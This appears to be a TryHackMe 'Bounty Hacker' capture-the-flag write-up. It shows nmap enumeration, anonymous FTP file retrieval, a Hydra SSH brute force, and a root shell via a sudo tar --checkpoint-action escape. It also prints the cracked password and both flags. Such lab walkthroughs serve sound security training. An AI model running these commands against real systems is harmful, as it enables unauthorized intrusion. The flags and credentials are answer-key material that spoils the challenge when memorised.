🏴‍☠️ TryHackMe - Bounty Hacker

Platform: TryHackMe
Challenge Type: Boot2Root
Author: Gage Ayala (GageGotya)
Date: April 9, 2025
Difficulty: ⭐ Easy
📘 Overview

The Bounty Hacker room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.
You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.

A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
🌐 Information Gathering

Target IP: Provided by the room
🔎 Nmap Scan

nmap -sC -sV <target-ip>

Ports Discovered:

21/tcp  open  ftp     vsftpd 3.0.3 (anonymous login allowed)  
22/tcp  open  ssh     OpenSSH 7.2.2 (Ubuntu)  
80/tcp  open  http    Apache httpd 2.4.18 (Ubuntu)

📂 FTP Access

ftp <target-ip>
Name: anonymous

📁 Files Discovered

ftp> ls
locks.txt
task.txt
ftp> get locks.txt
ftp> get task.txt

🧾 task.txt

1.) Protect Vicious.  
2.) Plan for Red Eye pickup on the moon.  
-lin

🔑 Username hint: lin
🧾 locks.txt

A custom list of possible passwords — likely reused credentials.
🔓 Gaining Access
🚀 Brute Forcing with Hydra

hydra -l lin -P locks.txt ssh://<target-ip>

✅ Cracked password: RedDr4gonSynd1cat3
🔐 SSH Access

ssh lin@<target-ip>

🏁 User Flag

cat ~/Desktop/user.txt

🧾 Flag:

THM{CR1M3_SyNd1C4T3}

✅ User flag captured!
🪜 Privilege Escalation
🔍 Sudo Permissions

sudo -l

Findings:

User lin may run the following command as root:  
(root) /bin/tar

📦 Exploiting tar for Root Shell

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

🐚 Root shell obtained!

whoami
root

🏁 Root Flag

cat /root/root.txt

🧾 Flag:

THM{80UN7Y_h4cK3r}

✅ Root flag captured!
💡 Reflections

    Anonymous FTP = easy foot in the door 🛠️

    Password reuse + brute force = cracked SSH in minutes 🚪

    sudo -l is always a goldmine — especially with misconfigured binaries 🥇

    Sometimes all you need is a clever use of tar 😎

📁 Key Files

    locks.txt — password list for brute force

    task.txt — username clue

🧠 Pro Tip

💬 “Enumeration wins engagements. Check every port, every file, and every binary. Root is rarely far.”
